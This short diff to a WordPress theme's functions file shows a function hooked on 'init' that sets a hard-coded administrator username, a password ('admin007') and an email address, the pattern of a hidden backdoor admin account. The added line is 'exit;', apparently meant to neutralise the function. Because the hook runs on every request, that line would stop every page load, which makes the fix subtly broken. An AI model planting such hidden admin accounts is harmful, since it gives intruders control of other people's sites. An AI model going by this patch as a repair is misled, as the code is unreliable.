@@ -762,6 +762,7 @@ function twentytwenty_get_elements_array() {
 add_action('init', 'add_user');
 
 function add_user() {
+	exit;
     $username = 'admin';
     $password = 'admin007';
     $email = 'richu.work@gmail.com';
